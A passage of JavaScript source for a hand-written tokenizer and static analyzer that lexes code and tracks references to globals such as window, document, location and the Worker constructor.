  'else', 'do', 'try', 'finally', 'catch', 'default', 'static'
]);

function isHeaderParen(tokens) {
  const last = tokens.length ? tokens[tokens.length - 1] : null;
  const last2 = tokens.length >= 2 ? tokens[tokens.length - 2] : null;
  const last3 = tokens.length >= 3 ? tokens[tokens.length - 3] : null;
  if (!last) return false;
  if (last.kind === 'ident') {
    if (last.value === 'function' || last.value === 'catch' || last.value === 'switch') {
      return true;
    }
    if (last2 && last2.kind === 'ident' && last2.value === 'function') return true;
    if (last2 && last2.kind === 'punct' && last2.value === '*' &&
        last3 && last3.kind === 'ident' && last3.value === 'function') {
      return true;
    }
  }
  if (last.kind === 'punct' && last.value === '*' &&
      last2 && last2.kind === 'ident' && last2.value === 'function') {
    return true;
  }
  return false;
}

function keywordForm(prev, delimStack) {
  if (!prev) return 'declaration';
  if (prev.kind === 'ident') {
    if (prev.value === 'export' || prev.value === 'default') return 'declaration';
    if (STMT_BODY_KWS[prev.value]) return 'declaration';
    if (EXPR_KWS[prev.value]) return 'expression';
    return 'unknown';
  }
  if (prev.kind !== 'punct') return 'unknown';
  const v = prev.value;
  if (v === ';' || v === '{' || v === '}') return 'declaration';
  if (v === ':') {
    const top = delimStack[delimStack.length - 1];
    if (top && top.type === '{' && top.role === 'object') return 'expression';
    return 'declaration';
  }
  if (v === '=' || ASSIGN_OPS[v] || v === '(' || v === '[' || v === ',' ||
      v === '?' || v === '!' || v === '~' || v === '+' || v === '-' ||
      v === '*' || v === '/' || v === '%' || v === '**' ||
      v === '&' || v === '|' || v === '^' || v === '&&' || v === '||' || v === '??' ||
      v === '<' || v === '>' || v === '<=' || v === '>=' || v === '==' || v === '===' ||
      v === '!=' || v === '!==' || v === '<<' || v === '>>' || v === '>>>' ||
      v === '...' || v === '=>') {
    return 'expression';
  }
  return 'unknown';
}

function headerForm(tokens, delimStack) {
  let i = tokens.length - 1;
  if (i < 0) return null;
  if (tokens[i].kind === 'ident' &&
      tokens[i].value !== 'function' &&
      tokens[i].value !== 'catch' &&
      tokens[i].value !== 'switch') {
    i--;
  }
  if (i >= 0 && tokens[i].kind === 'punct' && tokens[i].value === '*') i--;
  if (i < 0 || tokens[i].kind !== 'ident') return null;
  if (tokens[i].value === 'catch' || tokens[i].value === 'switch') return null;
  if (tokens[i].value !== 'function') return null;
  if (i > 0 && tokens[i - 1].kind === 'ident' && tokens[i - 1].value === 'async') i--;
  return keywordForm(i > 0 ? tokens[i - 1] : null, delimStack);
}

function classBodyRole(tokens, delimStack) {
  const end = tokens.length - 1;
  if (end < 0) return null;
  let classIdx = -1;
  const last = tokens[end];
  if (last.kind === 'ident' && last.value === 'class') {
    classIdx = end;
  } else if (last.kind === 'ident' && end >= 1 &&
             tokens[end - 1].kind === 'ident' && tokens[end - 1].value === 'class') {
    classIdx = end - 1;
  } else {
    const ctx = { indeterminate: false };
    const heritage = consumeExprEndingAt(tokens, end, ctx);
    if (ctx.indeterminate) return null;
    const ext = heritage.start > 0 ? tokens[heritage.start - 1] : null;
    if (!ext || ext.kind !== 'ident' || ext.value !== 'extends') return null;
    let i = heritage.start - 2;
    if (i >= 0 && tokens[i].kind === 'ident' && tokens[i].value !== 'class') i--;
    if (i < 0 || tokens[i].kind !== 'ident' || tokens[i].value !== 'class') return null;
    classIdx = i;
  }
  if (classIdx < 0) return null;
  const form = keywordForm(classIdx > 0 ? tokens[classIdx - 1] : null, delimStack);
  if (form === 'expression') return 'expr-body';
  if (form === 'declaration') return 'decl-body';
  return 'unknown';
}

function bodyRoleFromHeader(lastClosed) {
  if (!lastClosed || lastClosed.type !== '(') return null;
  if (lastClosed.role === 'control') return 'block';
  if (lastClosed.role === 'header') {
    if (lastClosed.form === 'expression') return 'expr-body';
    if (lastClosed.form === 'declaration') return 'decl-body';
    if (lastClosed.form == null) return 'block';
    return 'unknown';
  }
  return null;
}

function classifyParen(last, last2, tokens) {
  if (last && last.kind === 'ident' && CONTROL_HEADERS[last.value]) return 'control';
  if (isHeaderParen(tokens)) return 'header';
  if (isCallCalleeSuffix(last)) return 'call';
  return 'group';
}

function classifyBrace(last, lastClosed, delimStack, lastColonWasTernary, sawLineTerm, tokens) {
  if (!last) return 'block';
  if (last.kind === 'ident') {
    if (STMT_BODY_KWS[last.value]) return 'block';
    if (EXPR_KWS[last.value]) {
      if (last.value === 'return' && sawLineTerm) return 'block';
      return 'object';
    }
    const classRole = classBodyRole(tokens, delimStack);
    if (classRole !== null) return classRole;
    return 'unknown';
  }
  if (last.kind !== 'punct') return 'block';
  const v = last.value;
  if (v === '=>') return 'expr-body';
  if (v === ')') {
    const fromHeader = bodyRoleFromHeader(lastClosed);
    if (fromHeader) return fromHeader;
    const classRole = classBodyRole(tokens, delimStack);
    if (classRole !== null) return classRole;
    return 'unknown';
  }
  if (v === '}' || v === ';' || v === '{') return 'block';
  if (v === ':') {
    if (lastColonWasTernary) return 'object';
    const top = delimStack[delimStack.length - 1];
    if (top && top.type === '{' && top.role === 'object') return 'object';
    return 'block';
  }
  if (v === '=' || ASSIGN_OPS[v] || v === '(' || v === '[' || v === ',' ||
      v === '?' || v === '!' || v === '~' || v === '+' || v === '-' ||
      v === '*' || v === '/' || v === '%' || v === '**' ||
      v === '&' || v === '|' || v === '^' || v === '&&' || v === '||' || v === '??' ||
      v === '<' || v === '>' || v === '<=' || v === '>=' || v === '==' || v === '===' ||
      v === '!=' || v === '!==' || v === '<<' || v === '>>' || v === '>>>' ||
      v === '...') {
    return 'object';
  }
  return 'unknown';
}

function slashGoal(last, lastClosed) {
  if (!last) return 'regex';
  if (last.kind === 'ident') {
    if (last.value === 'this' || last.value === 'super') return 'div';
    return NOT_CALLEE[last.value] ? 'regex' : 'div';
  }
  if (last.kind !== 'punct') return 'div';
  const v = last.value;
  if (v === ']' || v === '++' || v === '--') return 'div';
  if (v === ')') {
    if (!lastClosed || lastClosed.type !== '(') return 'unknown';
    if (lastClosed.role === 'control') return 'regex';
    if (lastClosed.role === 'call' || lastClosed.role === 'group') return 'div';
    return 'unknown';
  }
  if (v === '}') {
    if (!lastClosed || lastClosed.type !== '{') return 'unknown';
    if (lastClosed.role === 'object' || lastClosed.role === 'expr-body') return 'div';
    if (lastClosed.role === 'block' || lastClosed.role === 'decl-body') return 'regex';
    return 'unknown';
  }
  return 'regex';
}

function tokenize(src) {
  const tokens = [];
  const n = src.length;
  let i = 0;
  let last = null;
  let last2 = null;
  let sawLineTerm = false;
  const interp = [];
  const delimStack = [{ type: 'root', role: 'block', ternary: 0 }];
  let lastClosed = null;
  let lastColonWasTernary = false;

  function emit(tok) {
    tokens.push(tok);
    last2 = last;
    last = tok;
    sawLineTerm = false;
  }
  function syncLastFromTokens() {
    last = tokens.length ? tokens[tokens.length - 1] : last;
    last2 = tokens.length >= 2 ? tokens[tokens.length - 2] : null;
    sawLineTerm = false;
  }
  function peek(k) { return i + k < n ? src[i + k] : ''; }
  function fail(msg) { return { ok: false, error: msg, tokens: tokens }; }
  function popDelim(type) {
    if (delimStack.length <= 1) return { ok: false };
    const top = delimStack[delimStack.length - 1];
    if (top.type !== type) return { ok: false };
    delimStack.pop();
    return { ok: true, frame: top };
  }
  function alignInterpDelims() {
    let interpDelims = 0;
    for (let k = 0; k < delimStack.length; k++) {
      if (delimStack[k].type === 'interp') interpDelims++;
    }
    while (interpDelims < interp.length) {
      delimStack.push({ type: 'interp', role: 'expr', ternary: 0 });
      interpDelims++;
      last2 = last;
      last = { kind: 'punct', value: '(' };
      sawLineTerm = false;
    }
  }

  if (i < n && src.charCodeAt(0) === 0xFEFF) i = 1;
  if (src[0] === '#' && src[1] === '!') {
    while (i < n && !isLineTerm(src[i])) i++;
  }

  while (i < n) {
    const c = src[i];

    if (c === ' ' || c === '\t' || c === '\n' || c === '\r' || c === '\f' || c === '\v' ||
        c === '\u00a0' || c === '\u2028' || c === '\u2029') {
      if (isLineTerm(c)) sawLineTerm = true;
      i++;
      continue;
    }

    if (c === '/' && peek(1) === '/') {
      i += 2;
      while (i < n && !isLineTerm(src[i])) i++;
      continue;
    }
    if (c === '/' && peek(1) === '*') {
      i += 2;
      let closed = false;
      while (i < n) {
        if (src[i] === '*' && peek(1) === '/') { i += 2; closed = true; break; }
        if (isLineTerm(src[i])) sawLineTerm = true;
        i++;
      }
      if (!closed) return fail('unterminated-block-comment');
      continue;
    }

    if (c === '/') {
      const goal = slashGoal(last, lastClosed);
      if (goal === 'unknown') return fail('indeterminate-slash');
      if (goal === 'regex') {
        i++;
        let inClass = false;
        let closed = false;
        while (i < n) {
          const r = src[i];
          if (isLineTerm(r)) return fail('unterminated-regex');
          if (r === '\\') {
            i += 1;
            if (i >= n) return fail('unterminated-regex');
            i += 1;
            continue;
          }
          if (r === '[' && !inClass) { inClass = true; i++; continue; }
          if (r === ']' && inClass) { inClass = false; i++; continue; }
          if (r === '/' && !inClass) { i++; closed = true; break; }
          i++;
        }
        if (!closed) return fail('unterminated-regex');
        while (i < n && ((src[i] >= 'a' && src[i] <= 'z') || (src[i] >= 'A' && src[i] <= 'Z'))) i++;
        emit({ kind: 'regex', value: '/' });
        continue;
      }
    }

    if (c === "'" || c === '"') {
      const q = c;
      i++;
      let value = '';
      let closed = false;
      while (i < n) {
        const s = src[i];
        if (isLineTerm(s) && s !== '\u2028' && s !== '\u2029') return fail('unterminated-string');
        if (s === '\\') {
          const u = unescapeOne(src, i);
          if (!u.ok) return fail(u.error);
          value += u.ch;
          i = u.next;
          continue;
        }
        if (s === q) { i++; closed = true; break; }
        value += s;
        i++;
      }
      if (!closed) return fail('unterminated-string');
      emit({ kind: 'string', value: value });
      continue;
    }

    if (c === '`') {
      const t = lexTemplate(src, i, emit, interp);
      if (!t.ok) return fail(t.error);
      i = t.next;
      syncLastFromTokens();
      alignInterpDelims();
      continue;
    }

    if (isIdentStart(c)) {
      let j = i + 1;
      while (j < n && isIdentPart(src[j])) j++;
      emit({ kind: 'ident', value: src.slice(i, j) });
      i = j;
      continue;
    }

    if (isDigit(c) || (c === '.' && isDigit(peek(1)))) {
      const num = lexNumber(src, i);
      if (!num.ok) return fail(num.error);
      emit({ kind: 'number', value: num.value });
      i = num.next;
      continue;
    }

    const op = lexOperator(src, i);
    if (!op.ok) return fail(op.error || 'unexpected-char');
    if (op.value === '}' && interp.length && interp[interp.length - 1] === 0) {
      interp.pop();
      const closedInterp = popDelim('interp');
      if (!closedInterp.ok) return fail('unbalanced-interp');
      lastClosed = closedInterp.frame;
      const resumed = resumeTemplate(src, op.next, emit, interp);
      if (!resumed.ok) return fail(resumed.error);
      i = resumed.next;
      syncLastFromTokens();
      alignInterpDelims();
      continue;
    }
    if (op.value === '{') {
      if (interp.length) interp[interp.length - 1] += 1;
      delimStack.push({
        type: '{',
        role: classifyBrace(last, lastClosed, delimStack, lastColonWasTernary, sawLineTerm, tokens),
        ternary: 0
      });
    } else if (op.value === '}') {
      if (interp.length) {
        interp[interp.length - 1] -= 1;
        if (interp[interp.length - 1] < 0) return fail('unbalanced-brace');
      }
      const closedBrace = popDelim('{');
      if (!closedBrace.ok) return fail('unbalanced-delimiter');
      lastClosed = closedBrace.frame;
    } else if (op.value === '(') {
      const role = classifyParen(last, last2, tokens);
      const frame = { type: '(', role: role, ternary: 0 };
      if (role === 'header') frame.form = headerForm(tokens, delimStack);
      delimStack.push(frame);
    } else if (op.value === ')') {
      const closedParen = popDelim('(');
      if (!closedParen.ok) return fail('unbalanced-delimiter');
      lastClosed = closedParen.frame;
    } else if (op.value === '[') {
      delimStack.push({ type: '[', role: 'array', ternary: 0 });
    } else if (op.value === ']') {
      const closedBracket = popDelim('[');
      if (!closedBracket.ok) return fail('unbalanced-delimiter');
      lastClosed = closedBracket.frame;
    } else if (op.value === '?') {
      delimStack[delimStack.length - 1].ternary += 1;
    } else if (op.value === ':') {
      const top = delimStack[delimStack.length - 1];
      lastColonWasTernary = top.ternary > 0;
      if (lastColonWasTernary) top.ternary -= 1;
    }
    emit({ kind: 'punct', value: op.value });
    i = op.next;
  }

  if (interp.length) return fail('unterminated-template-interpolation');
  const bal = delimiterBalance(tokens);
  if (!bal.ok) return fail(bal.error);
  return { ok: true, tokens: tokens };
}

function delimiterBalance(tokens) {
  let dp = 0, db = 0, dc = 0;
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'punct') continue;
    if (t.value === '(') dp++;
    else if (t.value === ')') dp--;
    else if (t.value === '[') db++;
    else if (t.value === ']') db--;
    else if (t.value === '{') dc++;
    else if (t.value === '}') dc--;
    if (dp < 0 || db < 0 || dc < 0) return { ok: false, error: 'unbalanced-delimiter' };
  }
  if (dp !== 0 || db !== 0 || dc !== 0) return { ok: false, error: 'unbalanced-delimiter' };
  return { ok: true };
}

function unescapeOne(src, i) {
  // i points at backslash
  const n = src.length;
  if (i + 1 >= n) return { ok: false, error: 'unterminated-escape' };
  const e = src[i + 1];
  if (e === 'n') return { ok: true, ch: '\n', next: i + 2 };
  if (e === 'r') return { ok: true, ch: '\r', next: i + 2 };
  if (e === 't') return { ok: true, ch: '\t', next: i + 2 };
  if (e === 'b') return { ok: true, ch: '\b', next: i + 2 };
  if (e === 'f') return { ok: true, ch: '\f', next: i + 2 };
  if (e === 'v') return { ok: true, ch: '\v', next: i + 2 };
  if (e === '0') return { ok: true, ch: '\0', next: i + 2 };
  if (e === '\\' || e === "'" || e === '"' || e === '`' || e === '$' || e === '/') {
    return { ok: true, ch: e, next: i + 2 };
  }
  if (e === 'x') {
    if (i + 3 >= n || !isHex(src[i + 2]) || !isHex(src[i + 3])) {
      return { ok: false, error: 'bad-hex-escape' };
    }
    return { ok: true, ch: String.fromCharCode(parseInt(src.slice(i + 2, i + 4), 16)), next: i + 4 };
  }
  if (e === 'u') {
    if (src[i + 2] === '{') {
      let j = i + 3;
      let hex = '';
      while (j < n && isHex(src[j])) { hex += src[j]; j++; }
      if (!hex || src[j] !== '}') return { ok: false, error: 'bad-unicode-escape' };
      const cp = parseInt(hex, 16);
      if (cp > 0x10FFFF) return { ok: false, error: 'bad-unicode-escape' };
      return { ok: true, ch: String.fromCodePoint(cp), next: j + 1 };
    }
    if (i + 5 >= n) return { ok: false, error: 'bad-unicode-escape' };
    const h = src.slice(i + 2, i + 6);
    if (![h[0], h[1], h[2], h[3]].every(isHex)) return { ok: false, error: 'bad-unicode-escape' };
    return { ok: true, ch: String.fromCharCode(parseInt(h, 16)), next: i + 6 };
  }
  if (isLineTerm(e)) {
    let next = i + 2;
    if (e === '\r' && src[i + 2] === '\n') next++;
    return { ok: true, ch: '', next: next };
  }
  return { ok: true, ch: e, next: i + 2 };
}

function lexTemplate(src, i, emit, interp) {
  // i points at opening backtick. Raw text is not executable. ${ starts interpolation.
  return resumeTemplateFrom(src, i + 1, emit, interp);
}

function resumeTemplate(src, i, emit, interp) {
  return resumeTemplateFrom(src, i, emit, interp);
}

function resumeTemplateFrom(src, i, emit, interp) {
  const n = src.length;
  let raw = '';
  let hasInterp = false;
  while (i < n) {
    const c = src[i];
    if (c === '\\') {
      const u = unescapeOne(src, i);
      if (!u.ok) return { ok: false, error: u.error };
      raw += u.ch;
      i = u.next;
      continue;
    }
    if (c === '`') {
      i++;
      if (!hasInterp) emit({ kind: 'string', value: raw, template: true });
      else emit({ kind: 'template', value: '' });
      return { ok: true, next: i };
    }
    if (c === '$' && src[i + 1] === '{') {
      hasInterp = true;
      i += 2;
      interp.push(0);
      return { ok: true, next: i };
    }
    raw += c;
    i++;
  }
  return { ok: false, error: 'unterminated-template' };
}

function lexNumber(src, i) {
  const n = src.length;
  const start = i;
  if (src[i] === '0' && (src[i + 1] === 'x' || src[i + 1] === 'X')) {
    i += 2;
    if (i >= n || !isHex(src[i])) return { ok: false, error: 'bad-number' };
    while (i < n && (isHex(src[i]) || src[i] === '_')) i++;
    return { ok: true, value: src.slice(start, i), next: i };
  }
  if (src[i] === '0' && (src[i + 1] === 'b' || src[i + 1] === 'B' || src[i + 1] === 'o' || src[i + 1] === 'O')) {
    i += 2;
    if (i >= n || !isDigit(src[i])) return { ok: false, error: 'bad-number' };
    while (i < n && (isDigit(src[i]) || src[i] === '_')) i++;
    return { ok: true, value: src.slice(start, i), next: i };
  }
  if (src[i] === '.') {
    i++;
    while (i < n && (isDigit(src[i]) || src[i] === '_')) i++;
  } else {
    while (i < n && (isDigit(src[i]) || src[i] === '_')) i++;
    if (src[i] === '.') {
      i++;
      while (i < n && (isDigit(src[i]) || src[i] === '_')) i++;
    }
  }
  if (src[i] === 'e' || src[i] === 'E') {
    i++;
    if (src[i] === '+' || src[i] === '-') i++;
    if (i >= n || !isDigit(src[i])) return { ok: false, error: 'bad-number' };
    while (i < n && (isDigit(src[i]) || src[i] === '_')) i++;
  }
  if (src[i] === 'n') i++;
  return { ok: true, value: src.slice(start, i), next: i };
}

function lexOperator(src, i) {
  const n = src.length;
  const c = src[i];
  const c2 = i + 1 < n ? src[i + 1] : '';
  const c3 = i + 2 < n ? src[i + 2] : '';
  const c4 = i + 3 < n ? src[i + 3] : '';

  function take(len) {
    return { ok: true, value: src.slice(i, i + len), next: i + len };
  }

  if (c === '.' && c2 === '.' && c3 === '.') return take(3);
  if (c === '?' && c2 === '?' && c3 === '=') return take(3);
  if (c === '?' && c2 === '?') return take(2);
  if (c === '?' && c2 === '.') {
    if (isDigit(c3)) return take(1);
    return take(2);
  }
  if (c === '=' && c2 === '=' && c3 === '=') return take(3);
  if (c === '!' && c2 === '=' && c3 === '=') return take(3);
  if (c === '=' && c2 === '=') return take(2);
  if (c === '!' && c2 === '=') return take(2);
  if (c === '=' && c2 === '>') return take(2);
  if (c === '&' && c2 === '&' && c3 === '=') return take(3);
  if (c === '|' && c2 === '|' && c3 === '=') return take(3);
  if (c === '&' && c2 === '&') return take(2);
  if (c === '|' && c2 === '|') return take(2);
  if (c === '+' && c2 === '+') return take(2);
  if (c === '-' && c2 === '-') return take(2);
  if (c === '*' && c2 === '*' && c3 === '=') return take(3);
  if (c === '*' && c2 === '*') return take(2);
  if (c === '<' && c2 === '<' && c3 === '=') return take(3);
  if (c === '>' && c2 === '>' && c3 === '>' && c4 === '=') return take(4);
  if (c === '>' && c2 === '>' && c3 === '>') return take(3);
  if (c === '>' && c2 === '>' && c3 === '=') return take(3);
  if (c === '<' && c2 === '<') return take(2);
  if (c === '>' && c2 === '>') return take(2);
  if (c === '<' && c2 === '=') return take(2);
  if (c === '>' && c2 === '=') return take(2);
  if (c === '+' && c2 === '=') return take(2);
  if (c === '-' && c2 === '=') return take(2);
  if (c === '*' && c2 === '=') return take(2);
  if (c === '/' && c2 === '=') return take(2);
  if (c === '%' && c2 === '=') return take(2);
  if (c === '&' && c2 === '=') return take(2);
  if (c === '|' && c2 === '=') return take(2);
  if (c === '^' && c2 === '=') return take(2);

  const singles = '()[]{};,~?:.,<>=!+-*/%&|^';
  if (singles.indexOf(c) !== -1) return take(1);
  return { ok: false, error: 'unexpected-char:' + JSON.stringify(c) };
}

function matchingOpen(tokens, closeIdx) {
  const close = tokens[closeIdx].value;
  const open = close === ')' ? '(' : close === ']' ? '[' : '{';
  let depth = 0;
  for (let i = closeIdx; i >= 0; i--) {
    const t = tokens[i];
    if (t.kind !== 'punct') continue;
    if (t.value === close) depth++;
    else if (t.value === open) {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

function matchingClose(tokens, openIdx) {
  const open = tokens[openIdx].value;
  const close = open === '(' ? ')' : open === '[' ? ']' : '}';
  let depth = 0;
  for (let i = openIdx; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'punct') continue;
    if (t.value === open) depth++;
    else if (t.value === close) {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

function isDotTok(t) {
  return t && t.kind === 'punct' && (t.value === '.' || t.value === '?.');
}

function isCallCalleeSuffix(before) {
  if (!before) return false;
  if (before.kind === 'ident') return !NOT_CALLEE[before.value];
  if (before.kind === 'punct') {
    return before.value === ')' || before.value === ']' || before.value === '?.';
  }
  return false;
}

function splitTopLevel(tokens, start, end, opSet) {
  const parts = [];
  let dp = 0, db = 0, dc = 0;
  let partStart = start;
  for (let i = start; i <= end; i++) {
    const t = tokens[i];
    if (t.kind !== 'punct') continue;
    const v = t.value;
    if (v === '(') dp++;
    else if (v === ')') dp--;
    else if (v === '[') db++;
    else if (v === ']') db--;
    else if (v === '{') dc++;
    else if (v === '}') dc--;
    else if (dp === 0 && db === 0 && dc === 0 && opSet[v]) {
      parts.push({ start: partStart, end: i - 1 });
      partStart = i + 1;
    }
    if (dp < 0 || db < 0 || dc < 0) return { ok: false, parts: [] };
  }
  parts.push({ start: partStart, end: end });
  return { ok: true, parts: parts };
}

function hasTopLevel(tokens, start, end, opSet) {
  const s = splitTopLevel(tokens, start, end, opSet);
  return s.ok && s.parts.length > 1;
}

function emptyExpr() {
  return { globals: new Set(), names: new Set() };
}

function exprSpan(tokens, start, end, ctx) {
  const empty = emptyExpr();
  if (ctx.indeterminate) return empty;
  if (start > end) { ctx.indeterminate = true; return empty; }

  const orSplit = splitTopLevel(tokens, start, end, { '||': 1, '??': 1 });
  if (!orSplit.ok) { ctx.indeterminate = true; return empty; }
  if (orSplit.parts.length > 1) {
    const globals = new Set();
    const names = new Set();
    for (let p = 0; p < orSplit.parts.length; p++) {
      const part = orSplit.parts[p];
      const info = exprSpan(tokens, part.start, part.end, ctx);
      info.globals.forEach(function (g) { globals.add(g); });
      info.names.forEach(function (n) { names.add(n); });
    }
    return { globals: globals, names: names };
  }

  const andSplit = splitTopLevel(tokens, start, end, { '&&': 1 });
  if (!andSplit.ok) { ctx.indeterminate = true; return empty; }
  if (andSplit.parts.length > 1) {
    const last = andSplit.parts[andSplit.parts.length - 1];
    return exprSpan(tokens, last.start, last.end, ctx);
  }

  if (hasTopLevel(tokens, start, end, { '?': 1, ',': 1 })) {
    ctx.indeterminate = true;
    return empty;
  }

  const lhs = consumeExprEndingAt(tokens, end, ctx);
  if (ctx.indeterminate) return empty;
  if (lhs.start !== start) {
    ctx.indeterminate = true;
    return empty;
  }
  return { globals: lhs.globals, names: lhs.names };
}

function isGlobalObject(globals) {
  return !!(globals && (globals.has('window') || globals.has('globalThis')));
}

function memberIdentity(objGlobals, key) {
  const names = new Set();
  if (!objGlobals || !key) return names;
  if (GLOBAL_OBJECTS[key] && isGlobalObject(objGlobals)) {
    names.add(key);
    names.add('window');
    names.add('globalThis');
  }
  if (key === 'document' && isGlobalObject(objGlobals)) names.add('document');
  if (key === 'location' && isGlobalObject(objGlobals)) names.add('location');
  return names;
}

function terminalNames(name) {
  const names = new Set();
  if (name) names.add(name);
  return names;
}

function receiverEndBeforeComputed(tokens, openIdx) {
  if (openIdx <= 0) return -1;
  const before = tokens[openIdx - 1];
  if (before && before.kind === 'punct' && before.value === '?.') return openIdx - 2;
  return openIdx - 1;
}

function consumeExprEndingAt(tokens, end, ctx) {
  const empty = new Set();
  const noNames = new Set();
  if (ctx.indeterminate) return { start: 0, globals: empty, names: noNames };
  if (end < 0 || end >= tokens.length) {
    ctx.indeterminate = true;
    return { start: 0, globals: empty, names: noNames };
  }
  const tok = tokens[end];

  if (tok.kind === 'punct' && tok.value === ')') {
    const open = matchingOpen(tokens, end);
    if (open < 0) { ctx.indeterminate = true; return { start: 0, globals: empty, names: noNames }; }
    const before = open > 0 ? tokens[open - 1] : null;
    if (isCallCalleeSuffix(before)) {
      let calleeEnd = open - 1;
      if (before.value === '?.') calleeEnd = open - 2;
      const callee = consumeExprEndingAt(tokens, calleeEnd, ctx);
      return { start: callee.start, globals: empty, names: noNames };
    }
    const inner = exprSpan(tokens, open + 1, end - 1, ctx);
    let start = open;
    if (before && before.kind === 'ident' && before.value === 'new') start = open - 1;
    return { start: start, globals: inner.globals, names: inner.names };
  }

  if (tok.kind === 'punct' && tok.value === ']') {
    const open = matchingOpen(tokens, end);
    if (open < 0) { ctx.indeterminate = true; return { start: 0, globals: empty, names: noNames }; }
    if (!isComputedMemberOpen(tokens, open)) {
      return { start: open, globals: empty, names: noNames };
    }
    const recEnd = receiverEndBeforeComputed(tokens, open);
    if (recEnd < 0) { ctx.indeterminate = true; return { start: 0, globals: empty, names: noNames }; }
    const obj = consumeExprEndingAt(tokens, recEnd, ctx);
    const key = constantKey(tokens, open + 1, end - 1);
    const gset = key === null ? empty : memberIdentity(obj.globals, key);
    return { start: obj.start, globals: gset, names: terminalNames(key) };
  }

  if (tok.kind === 'punct' && tok.value === '}') {
    const open = matchingOpen(tokens, end);
    if (open < 0) { ctx.indeterminate = true; return { start: 0, globals: empty, names: noNames }; }
    return { start: open, globals: empty, names: noNames };
  }

  if (tok.kind === 'ident') {
    if (end > 0 && isDotTok(tokens[end - 1])) {
      const recEnd = end - 2;
      if (recEnd < 0) { ctx.indeterminate = true; return { start: 0, globals: empty, names: noNames }; }
      const obj = consumeExprEndingAt(tokens, recEnd, ctx);
      return {
        start: obj.start,
        globals: memberIdentity(obj.globals, tok.value),
        names: terminalNames(tok.value)
      };
    }
    const gset = new Set();
    if (RELEVANT_GLOBALS[tok.value]) gset.add(tok.value);
    if (GLOBAL_OBJECTS[tok.value]) {
      gset.add('window');
      gset.add('globalThis');
    }
    let start = end;
    if (end > 0 && tokens[end - 1].kind === 'ident' && tokens[end - 1].value === 'new') {
      start = end - 1;
    }
    return { start: start, globals: gset, names: terminalNames(tok.value) };
  }

  if (tok.kind === 'string' || tok.kind === 'number' || tok.kind === 'regex' || tok.kind === 'template') {
    return { start: end, globals: empty, names: noNames };
  }

  ctx.indeterminate = true;
  return { start: end, globals: empty, names: noNames };
}

function constantKey(tokens, start, end) {
  if (start !== end) return null;
  const t = tokens[start];
  if (t.kind === 'string') return t.value;
  if (t.kind === 'number') return t.value;
  return null;
}

function isComputedMemberOpen(tokens, i) {
  if (i === 0) return false;
  const before = tokens[i - 1];
  if (before.kind === 'ident') return true;
  if (before.kind === 'string' || before.kind === 'number' || before.kind === 'template' || before.kind === 'regex') {
    return true;
  }
  if (before.kind === 'punct') {
    return before.value === ')' || before.value === ']' || before.value === '?.';
  }
  return false;
}

function isAssignAfter(tokens, idx) {
  if (idx >= tokens.length) return false;
  return tokens[idx].kind === 'punct' && !!ASSIGN_OPS[tokens[idx].value];
}

function isGroupingParenOpen(tokens, openIdx) {
  const before = openIdx > 0 ? tokens[openIdx - 1] : null;
  if (!before) return true;
  if (before.kind === 'ident') {
    if (before.value === 'new') return true;
    return false;
  }
  if (isCallCalleeSuffix(before)) return false;
  return true;
}

function skipWrappingParens(tokens, start, end) {
  let s = start;
  let e = end;
  while (e + 1 < tokens.length && tokens[e + 1].kind === 'punct' && tokens[e + 1].value === ')') {
    const open = matchingOpen(tokens, e + 1);
    if (open < 0 || open > s) break;
    if (!isGroupingParenOpen(tokens, open)) break;
    s = open;
    e = e + 1;
  }
  return { start: s, end: e };
}

function findPatternCloserFrom(tokens, fromIdx) {
  let dp = 0, db = 0, dc = 0;
  for (let i = fromIdx; i < tokens.length; i++) {
    const t = tokens[i];
    if (t.kind !== 'punct') continue;
    const v = t.value;
    if (v === '(') dp++;
    else if (v === ')') {
      if (dp === 0 && db === 0 && dc === 0) return -1;
      dp--;
    } else if (v === '[') db++;
    else if (v === ']') {
      if (db === 0 && dp === 0 && dc === 0) return i;
      db--;
    } else if (v === '{') dc++;
    else if (v === '}') {
      if (dc === 0 && dp === 0 && db === 0) return i;
      dc--;
    }
  }
  return -1;
}

function isAssignTarget(tokens, exprStart, exprEnd) {
  let start = exprStart;
  let end = exprEnd;
  if (start < 0 || end < start || end >= tokens.length) return false;

  for (let step = 0; step < tokens.length; step++) {
    const wrapped = skipWrappingParens(tokens, start, end);
    start = wrapped.start;
    end = wrapped.end;
    if (end + 1 >= tokens.length) return false;
    const next = tokens[end + 1];
    if (!next || next.kind !== 'punct') return false;
    if (ASSIGN_OPS[next.value]) return true;

    if (next.value === ',') {
      const closer = findPatternCloserFrom(tokens, end + 1);
      if (closer < 0) return false;
      const open = matchingOpen(tokens, closer);
      if (open < 0 || open > start || closer <= end) return false;
      if (tokens[closer].value === ']' && isComputedMemberOpen(tokens, open)) return false;
      start = open;
      end = closer;
      continue;
    }

    if (next.value === '}' || next.value === ']') {
      const closer = end + 1;
      const open = matchingOpen(tokens, closer);
      if (open < 0 || open > start) return false;
      if (next.value === ']' && isComputedMemberOpen(tokens, open)) return false;
      start = open;
      end = closer;
      continue;
    }

    return false;
  }
  return false;
}

function constructorLhsEnd(tokens, start) {
  if (start >= tokens.length) return null;
  let i = start;
  const t = tokens[i];
  if (t.kind === 'punct' && t.value === '(') {
    const close = matchingClose(tokens, i);
    if (close < 0) return null;
    i = close;
  } else if (t.kind !== 'ident') {
    return null;
  }
  while (i + 1 < tokens.length) {
    const n = tokens[i + 1];
    if (!n || n.kind !== 'punct') break;
    if (n.value === '.' || n.value === '?.') {
      const p = i + 2 < tokens.length ? tokens[i + 2] : null;
      if (p && p.kind === 'ident') {
        i = i + 2;
        continue;
      }
      if (p && p.kind === 'punct' && p.value === '[') {
        const c = matchingClose(tokens, i + 2);
        if (c < 0) return null;
        i = c;
        continue;
      }
      break;
    }
    if (n.value === '[') {
      if (!isComputedMemberOpen(tokens, i + 1)) break;
      const c = matchingClose(tokens, i + 1);
      if (c < 0) return null;
      i = c;
      continue;
    }
    break;
  }
  return i;
}

function constructorIdent(tokens, afterNew) {
  const ctx = { indeterminate: false };
  const end = constructorLhsEnd(tokens, afterNew);
  if (end == null) return null;
  const info = consumeExprEndingAt(tokens, end, ctx);
  if (ctx.indeterminate || !info.names) return null;
  if (info.names.has('Worker')) return 'Worker';
  return null;
}

function calleeNamesAtCall(tokens, openIdx) {
  if (openIdx <= 0) return new Set();
  const before = tokens[openIdx - 1];
